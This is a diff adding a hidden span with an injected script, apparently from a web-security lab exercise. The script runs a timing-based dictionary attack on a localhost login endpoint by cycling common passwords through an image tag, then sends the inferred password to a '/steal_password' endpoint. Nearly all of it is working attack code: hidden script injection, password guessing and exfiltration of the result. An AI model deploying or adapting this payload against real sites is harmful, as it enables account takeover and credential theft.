@@ -1,0 +1,31 @@
+<span style='display:none'>
+  <Img id='test'/>
+  <Script>
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+    var correct_pass_ind = -1, correct_pass_time = 0;
+    var test = document.getElementById(`test`);
+    test.onerror = () => {
+      var end = new Date();
+      console.log(`Time elapsed ${end-start} for pass index ${index}, pass index ${index} is ${dictionary[index]}`);
+
+      if (correct_pass_time < end-start) {
+        correct_pass_ind = index;
+        correct_pass_time = end - start;
+      }
+
+      start = new Date();
+      if (index < dictionary.length - 1) {
+        test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+      } else {
+        console.log(`Password is ${dictionary[correct_pass_ind]}\nYou now logged in as userx!`);
+        var xhttp = new XMLHttpRequest();
+        xhttp.open(`GET`, `http://localhost:3000/steal_password?password=${dictionary[correct_pass_ind]}&timeElapsed=${correct_pass_time}`);
+        xhttp.send();
+      }
+      index += 1;
+    };
+    var start = new Date();
+    test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+  </Script>
+</span>
